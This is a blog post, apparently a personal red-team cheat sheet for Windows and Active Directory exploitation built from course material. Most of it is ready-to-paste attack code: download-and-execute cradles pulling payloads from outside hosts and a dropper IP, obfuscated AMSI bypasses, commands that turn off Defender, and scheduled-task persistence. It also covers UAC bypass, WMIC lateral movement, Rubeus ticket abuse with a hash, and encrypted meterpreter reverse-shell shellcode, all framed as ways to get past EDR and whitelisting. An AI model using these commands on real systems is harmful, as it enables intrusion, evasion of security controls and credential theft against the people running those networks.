---
title: "Offensive Notes" 
layout: "post"
---

This blog post has been updated based on some tools and techniques from Offensive Security’s PEN-300 course as well ad the CRTO course from Rastamouse. 
It should be useful in a lot of cases when dealing with Windows / AD exploitation. This is my quick and dirty cheat sheet. 


## 1) Enumeration

### LDAP AD enumeration

```powershell
#Build LDAP filters to look for users with SPN values registered for current domain
#$ldapFilter = "(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"

#Build LDAP filters to look for domain controller
$ldapFilter = "(primaryGroupID=516)"
$domain = New-Object System.DirectoryServices.DirectoryEntry
$search = New-Object System.DirectoryServices.DirectorySearcher
$search.SearchRoot = $domain
$search.Filter = $ldapFilter
$search.SearchScope = "Subtree"
$results = $search.FindAll()
foreach ($result in $results)
{
	$object = $result.GetDirectoryEntry()
	Write-Host "Object Name = " $object.name
}
```

## 2) PowerShell one-liners

.NET reflection allows an application to obtain information about loaded assemblies and the types defined within them, then even create and invoke new instances.

### Blend in execution of implant or beacon into regular activity

If you find yourself inside a target environment with strong application whitelisting controls, pesky EDR that blocks common LOLBins, and/or just need an option to blend in execution of your unsigned implant or beacon into regular activity, consider this: 
Microsoft-signed utility buried in c:\windows\diagnostics\system\networking that will execute unsigned DLLs through the Microsoft utility. I’m not sure why this functionality exists for this particular utility, and I seriously doubt Microsoft will address it;
```powershell
powershell.exe -ep bypass -command “set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()”```
```



### Load PowerShell script reflectively
Proxy-aware:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
```
Non-proxy aware:
```powershell
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
```
__Note:__ Again, this will likely get flagged 🚩. For opsec-safe download cradles, check out [CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)



### Load C# assembly reflectively

Ensure that the referenced class and main methods are Public before running this. Note that a process-wide AMSI bypass may be required for this, [check this out](https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/)

```powershell
# Download and run assembly without arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main("".Split())

# Download and run Rubeus, with arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Execute a specific method from an assembly (e.g. a DLL)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

### Load DLL assembly reflectively 

The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell:

```powershell
PS > [System.Reflection.Assembly]::LoadFile("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```


We could also encode the DLL to a base64 string and load it without it needing to be on disk: 🚩

```powershell
PS > $dll = [System.IO.File]::ReadAllBytes("C:\Users\IEUser\source\repos\ReflectionDemo\bin\Release\ReflectionDemo.dll")
PS > $dllstring = [System.Convert]::ToBase64String($dll)
PS > [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($dllstring))
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```

Or download the DLL from a remote location:

```powershell
PS > $dll = (new-object net.webclient).DownloadData("http://10.8.0.6/ReflectionDemo.dll")
PS > [System.Reflection.Assembly]::Load($dll)
PS > [ReflectionDemo.DemoClass]::PrintStuff()
Hello World
```

You can use this reflection technique to download and run a GruntStager EXE directly from memory, without having it touch disk.  For example:

```powershell
PS > $monk = (new-object net.webclient).downloaddata("http://192.168.152.100/monk.exe")
PS > [System.Reflection.Assembly]::Load($monk)

GAC Version Location
--- ------- --------
False v4.0.30319

PS > [MonkStager.MonkStager]::Execute()
```

__Note:__ .NET 4.8, Assembly.Load is AMSI-aware 🚩

### Load remote .NET assembly with PowerShell and XOR Key

```powershell 

$wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
$k="XOR\_KEY";$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://evil.computer/malware.exe")))|%{$_-bxor$k[$i++%$k.length]}
[System.Reflection.Assembly]::Load($b) | Out-Null
$parameters=@("arg1", "arg2")
[namespace.Class]::Main($parameters)
```

### Load remote .NET assembly, AMSI patch, APPDATA execution

```powershell
First, the payload script would change PowerShell’s running configuration so the current user would be allowed to execute PowerShell scripts with no restrictions, using the following command:

New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value "Unrestricted" -PropertyType String -Force

Secondly, the script will download and execute an AMSI patch bypass: 
 
$wr = [System.NET.webRequest]::Create('http://192.168.1.125/AMSI-bypass.ps1')
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

The script then proceeds to download a Windows executable file from a remote server, using .NET’s WebClient class:

$ProcName = "dropper.exe"
$wc = [System.Net.WebClient]::new()
$wc.DownloadFile("http://62[.]182[.]84[.]61/$ProcName", "$env:APPDATA\$ProcName")
$wc.Dispose()

Finally, the payload script executes the downloaded binary (which we will refer to as the “2nd stage payload”), after clearing the script’s output from the screen:

Clear-Host
Start-Process ("$env:APPDATA\$ProcName")

The content of AMSI-Bypass is listed below:

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

The final & complete downloadCradleScript.ps1 is listed below: 

```powershell

New-ItemProperty -Path 'HKCU:Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' 
-Name 'ExecutionPolicy' -Value "Unrestricted" -PropertyType String -Force Clear-Host
$wr = [System.NET.webRequest]::Create('http://192.168.1.125/AMSI-bypass.ps1')
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
$ProcName = "dropper.exe" $WebFile = "http://62[.]182[.]84[.]61/4563636/$ProcName"  
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName") 
Start-Process ("$env:APPDATA\$ProcName")


```


### 3) Powershell AMSI Bypass

Patching AMSI will help bypass AV warnings triggered when executing PowerShell scripts that are marked as malicious (such as PowerView). Do not use as-is in covert operations, as they will get flagged. Obfuscate, or even better, eliminate the need for an __AMSI bypass__ altogether by altering your scripts to beat signature-based detection.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Obfuscation example for copy-paste purposes:

```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Another method could be to compile the C# bypass to a .NET DLL and use PowerShell to load it reflectively.

```powershell
PS C:\> $bytes = [System.IO.File]::ReadAllBytes("c:\tools\AmsiTest\bin\Debug\AmsiTest.dll")
PS C:\> [System.Reflection.Assembly]::Load($bytes)
GAC Version Location
--- ------- -------
False v4.0.30319
PS C:\> [Amsi]::Bypass()
PS C:\> Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program.
```

```powershell
# Base 64 AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)


$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```


### 4) Applocker 

Fortunately for us, there is a powershell module named AppLocker, which can query the AppLocker rules that are enforced on the current system. 
Below is a simple powershell script that outputs the rules in a readable format so you can use this information to bypass them.

```powershell

Import-Module AppLocker
[xml]$data = Get-AppLockerPolicy -effective -xml

# Extracts All Rules and print them.
Write-Output "[+] Printing Applocker Rules [+]`n"
($data.AppLockerPolicy.RuleCollection | ? { $_.EnforcementMode -match "Enabled" }) | ForEach-Object -Process {
Write-Output ($_.FilePathRule | Where-Object {$_.Name -NotLike "(Default Rule)*"}) | ForEach-Object -Process {Write-Output "=== File Path Rule ===`n`n Rule Name : $($_.Name) `n Condition : $($_.Conditions.FilePathCondition.Path)`n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
Write-Output ($_.FileHashRule) | ForEach-Object -Process { Write-Output "=== File Hash Rule ===`n`n Rule Name : $($_.Name) `n File Name :  $($_.Conditions.FileHashCondition.FileHash.SourceFileName) `n Hash type : $($_.Conditions.FileHashCondition.FileHash.Type) `n Hash :  $($_.Conditions.FileHashCondition.FileHash.Data) `n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
Write-Output ($_.FilePublisherRule | Where-Object {$_.Name -NotLike "(Default Rule)*"}) | ForEach-Object -Process {Write-Output "=== File Publisher Rule ===`n`n Rule Name : $($_.Name) `n PublisherName : $($_.Conditions.FilePublisherCondition.PublisherName) `n ProductName : $($_.Conditions.FilePublisherCondition.ProductName) `n BinaryName : $($_.Conditions.FilePublisherCondition.BinaryName) `n BinaryVersion Min. : $($_.Conditions.FilePublisherCondition.BinaryVersionRange.LowSection) `n BinaryVersion Max. : $($_.Conditions.FilePublisherCondition.BinaryVersionRange.HighSection) `n Description: $($_.Description) `n Group/SID : $($_.UserOrGroupSid)`n`n"}
}

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections	
Get-AppLockerPolicy -Local).RuleCollections
Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP\v4" /s

```
The script will try to find all the AppLocker rules that don’t have the Default Rule in their name and then output the FilePath,FilePublisher and FileHash rules.

### 5) Powershell CLM & LAPS

#### PowerShell Constrained Language Mode
Sometimes you may find yourself in a PowerShell session that enforces Constrained Language Mode (CLM). This is very often the case when paired with AppLocker.
You can identify you’re in constrained language mode by polling the following variable to get the current language mode. It will say FullLanguage for an unrestricted session, and ConstrainedLanguage for CLM. 

```powershell
$ExecutionContext.SessionState.LanguageMode
```

The constraints posed by CLM will block many of your exploitations attempts. One quick and dirty bypass is to use in-line functions, which sometimes works - if e.g. whoami is blocked, try the following:

```powershell
&{whoami}
```

#### LAPS 
We can use `LAPSToolkit.ps1` to identify which machines in the domain use LAPS, and which domain groups are allowed to read LAPS passwords. If we are in this group, we can get the current LAPS passwords using this tool as well.

```powershell
#Get computers running LAPS, along with their passwords if we're allowed to read those
Get-LAPSComputers
#Get groups allowed to read LAPS passwords
Find-LAPSDelegatedGroups
```


## 6) PrivEsc

#### PowerUp

```py
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
Invoke-AllChecks | Out-File -Encoding ASCII Allchecks.txt
```

If you want to invoke everything without touching disk, use something like this:

```py
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
```

#### UAC Bypasses

Covenant has `BypassUACCommand` and `BypassUACGrunt` Tasks which can be used 

```cpp
SharpShell /code:"var startInfo = new System.Diagnostics.ProcessStartInfo { FileName = @\"C:\Windows\System32\Taskmgr.exe\", WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden }; var taskmgr = new System.Diagnostics.Process { StartInfo = startInfo }; taskmgr.Start(); return taskmgr.Id.ToString();"

BypassUACCommand cmd.exe "/c powershell -enc [...snip...]"
```

## 7) Persistence

### Classic Startup folder

Just drop a binary in current user folder, will trigger when current user signs in:

```py
"C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```
Or in the startup folder, requires administrative privileges but will trigger as SYSTEM on boot and when any user signs on:

```py
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

### Schedule Tasks

This PowerShell script will execute a new Grunt (using our existing PowerShell payload) every 4 hours for up to 30 days. If you omit the RepetitionDuration option in the trigger, it will repeat indefinitely.

```powershell
function New-ScheduledTaskPersistence {

    $name = "Persistence"
  
    $trigger = New-ScheduledTaskTrigger `
        -Once `
        -At 11am `
        -RepetitionInterval (New-TimeSpan -Hours 4) `
        -RepetitionDuration (New-TimeSpan -Days 30)
  
      $action = New-ScheduledTaskAction `
        -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -Argument "-Sta -Nop -Window Hidden -EncodedCommand " `
        -WorkingDirectory "C:\Windows\System32"
  
      Register-ScheduledTask `
        -TaskName $name `
        -Trigger $trigger `
        -Action $action `
        -Force
}
```
To execute this PowerShell script on the target, go to the Interact CLI, import and execute the powershell module 


```cpp
schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00
```

### COM Hijacks

Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).

Process Monitor is part of the excellent Sysinternals Suite from Microsoft. It shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives. Launch procmon64.exe on attacker-windows.

<p align="center">
  <img src="/assets/posts/2021-03-01-Windows-Evasion/procmon.JPG">
</p>

Another great place to look for hijackable COM components is in the Task Scheduler.  Rather than executing binaries on disk, many of the default Windows Tasks actually use Custom Triggers to call COM objects.  
And because they're executed via the Task Scheduler, it's easier to predict when they're going to be triggered.

This simple powershell script can be used to achieve this operation. 

```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
    if ($Task.Actions.ClassId -ne $null)
    {
        if ($Task.Triggers.Enabled -eq $true)
        {
            if ($Task.Principal.GroupId -eq "Users")
            {
                Write-Host "Task Name: " $Task.TaskName
                Write-Host "Task Path: " $Task.TaskPath
                Write-Host "CLSID: " $Task.Actions.ClassId
                Write-Host
            }
        }
    }
}
```

## 8) Lateral Movement

### WMIC Lateral Movement

```cpp
wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
```

## 9) MSSQL databases

PowerUpSQL can be used to look for databases within the domain, and gather further information on databases.

```py
# Get MSSQL databases in the domain, and test connectivity
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft

# Try to get information on all domain databases
Get-SQLInstanceDomain | Get-SQLServerInfo

# Get information on a single reachable database
Get-SQLServerInfo -Instance 'sql-1.cyber.io,1433'

# Scan for MSSQL misconfigurations to escalate to SA
Invoke-SQLAudit -Verbose -Instance UFC-SQLDEV

#PowerUpSQL automatically crawl database links
Get-SQLServerLinkCrawl -Instance 'sql-1.cyber.io,1433'

# Execute SQL query
Get-SQLQuery -Query "SELECT system_user" -Instance sql-1.cyber.io

# Run command (requires XP_CMDSHELL to be enabled)
Invoke-SQLOSCmd -Instance sql-1.cyber.io -Command "whoami" |  select -ExpandProperty CommandResults
Invoke-SQLOSCmd -Instance sql-1.cyberbotic.io -Command 'dir C:\' -RawResults

# Automatically find all linked databases
Get-SqlServerLinkCrawl -Instance dcorp-mssql | select instance,links | ft
```

## 10) Domain Dominance

## 11) NET Assembly Reflection - Web inject

```cs
using System;
using System.Net;
using System.Reflection;

namespace Nappa
{
    class Program
    {
        static void ReflectFromWeb(string url)
        {
            WebClient client = new WebClient();
            byte[] programBytes = client.DownloadData(url);
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new String[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters);
        }
        static void Main(string[] args)
        {
            ReflectFromWeb("http://CHANGEME/HelloReflectionWorld.exe");
        }
    }
}
```

## 12) Misc & Encoding

##### PeZOR Packing and Encoding 

```cpp
PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
```

##### Cat to base64 

```cpp
cat file.ps1 | iconv -t utf-16le | base64 -w 0
powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
```

##### Powershell to base64

```cpp
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi"))

$filename = "C:\Users\&&&&&\Desktop\exclusion\showPidx64.bin"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
``` 

##### Hex Encode 

```py
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
//cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
xxd -i encmeter.bin
```

##### Default MSF bin

```py
msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
```

##### Shellcode reverse bytes array

```powershell
//Reversed bytes array 
//msfvenom -a x64 -p windows/x64/messagebox Text="Hello from shellcode"  -f csharp
byte[] sc = new byte [299] { 0x00, 0x78, 0x6f, 0x42, 0x65, 0x67, 0x61, 0x73, 0x73, 0x65, 0x4d, 0x00, 0x65, 0x64, 0x6f, 0x63, 0x6c, 0x6c, 0x65, 0x68, 0x73, 0x20, 0x6d, 0x6f, 0x72, 0x66, 0x20, 0x6f, 0x6c, 0x6c, 0x65, 0x48, 0xd5, 0xff, 0x56, 0xa2, 0xb5, 0xf0, 0xba, 0x41, 0xc9, 0x31, 0x48, 0xd5, 0xff, 0x07, 0x56, 0x83, 0x45, 0xba, 0x41, 0xc9, 0x31, 0x48, 0x00, 0x00, 0x01, 0x13, 0x85, 0x8d, 0x4c, 0x3e, 0x00, 0x00, 0x00, 0xfe, 0x95, 0x8d, 0x48, 0x3e, 0x00, 0x00, 0x00, 0x00, 0xc1, 0xc7, 0x49, 0x5d, 0xff, 0xff, 0xff, 0x49, 0xe9, 0x12, 0x8b, 0x48, 0x3e, 0x5a, 0x59, 0x41, 0x58, 0xe0, 0xff, 0x52, 0x41, 0x20, 0xec, 0x83, 0x48, 0x5a, 0x41, 0x59, 0x41, 0x58, 0x41, 0x5a, 0x59, 0x5e, 0x58, 0x41, 0x58, 0x41, 0xd0, 0x01, 0x48, 0x88, 0x04, 0x8b, 0x41, 0x3e, 0xd0, 0x01, 0x49, 0x1c, 0x40, 0x8b, 0x44, 0x3e, 0x48, 0x0c, 0x8b, 0x41, 0x3e, 0x66, 0xd0, 0x01, 0x49, 0x24, 0x40, 0x8b, 0x44, 0x3e, 0x58, 0xd6, 0x75, 0xd1, 0x39, 0x45, 0x08, 0x24, 0x4c, 0x03, 0x4c, 0x3e, 0xf1, 0x75, 0xe0, 0x38, 0xc1, 0x01, 0x41, 0x0d, 0xc9, 0xc1, 0x41, 0xac, 0xc0, 0x31, 0x48, 0xc9, 0x31, 0x4d, 0xd6, 0x01, 0x48, 0x88, 0x34, 0x8b, 0x41, 0x3e, 0xc9, 0xff, 0x48, 0x5c, 0xe3, 0xd0, 0x01, 0x49, 0x20, 0x40, 0x8b, 0x44, 0x3e, 0x18, 0x48, 0x8b, 0x3e, 0x50, 0xd0, 0x01, 0x48, 0x6f, 0x74, 0xc0, 0x85, 0x48, 0x00, 0x00, 0x00, 0x88, 0x80, 0x8b, 0x3e, 0xd0, 0x01, 0x48, 0x3c, 0x42, 0x8b, 0x3e, 0x20, 0x52, 0x8b, 0x48, 0x3e, 0x51, 0x41, 0x52, 0xed, 0xe2, 0xc1, 0x01, 0x41, 0x0d, 0xc9, 0xc1, 0x41, 0x20, 0x2c, 0x02, 0x7c, 0x61, 0x3c, 0xac, 0xc0, 0x31, 0x48, 0xc9, 0x31, 0x4d, 0x4a, 0x4a, 0xb7, 0x0f, 0x48, 0x3e, 0x50, 0x72, 0x8b, 0x48, 0x3e, 0x20, 0x52, 0x8b, 0x48, 0x3e, 0x18, 0x52, 0x8b, 0x48, 0x3e, 0x60, 0x52, 0x8b, 0x48, 0x65, 0xd2, 0x31, 0x48, 0x56, 0x51, 0x52, 0x50, 0x41, 0x51, 0x41, 0x00, 0x00, 0x00, 0xd0, 0xe8, 0xff, 0xff, 0xff, 0xf0, 0xe4, 0x81, 0x48, 0xfc};
Array.Reverse(sc);
int size = sc.Length;
//There are resource online that can help you generating a reverse array
```


##### PS memory 

```powershell
$string = "iex (New-Object Net.WebClient).DownloadString('http://<webServer>:8082/ps.ps1')"
$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
echo $encodedcommand
```

##### Impacket
Impacket is a collection of Python classes for working with network protocols
```py
proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes e353da88f9c4331504f70d471f0f9cb1:REDACTED a.user@10.10.120.1
```


#### Disable Defender 

```powershell
Shell comand to disable Defender 

shell Set-MpPreference -DisableRealtimeMonitoring $true 
shell Set-MpPreference -EnableRealtimeMonitoring $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScanningNetworkFiles $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -DisableCatchupFullScan $True
Set-MpPreference -DisableCatchupQuickScan $True
```

#### Encrypted Msfvenom shellcode

```powershell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
xxd -i encmeter.bin
	
Default MessageBox
msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
```

#### AdFind Enumerations

```powershell
C:\Windows\system32\cmd.exe /C adfind.exe -gcb -sc trustdmp > trustdmp.txt
C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=group)" > ad_group.txt
C:\Windows\system32\cmd.exe /C adfind.exe -subnets -f (objectCategory=subnet)> subnets.txt
C:\Windows\system32\cmd.exe /C adfind.exe -sc trustdmp > trustdmp.txt
C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=organizationalUnit)" > ad_ous.txt
C:\Windows\system32\cmd.exe /C adfind.exe -f "objectcategory=computer" > ad_computers.txt
C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=person)" > ad_users.txt
```

## 13) LoLBins Executions

#### Cmdl32.exe

```powershell
Need to go under the radar downloading #mimikatz (and other suspect payloads)? Then newly discovered #lolbin?

"C:\Windows\System32\Cmdl32.exe" (signed by MS) is for you. It's like a new certutil.exe but absolutely unheard of by any antivirus software!

https://twitter.com/ElliotKillick/status/1455897435063074824
```

#### WorkFolders.exe

```powershell
"C:\Windows\System32\WorkFolders.exe" (signed by MS) can be used to run arbitrary executables in the current working directory with the name control.exe. 

It's like a new rundll32.exe #lolbin but for EXEs!

https://twitter.com/ElliotKillick/status/1449812843772227588
```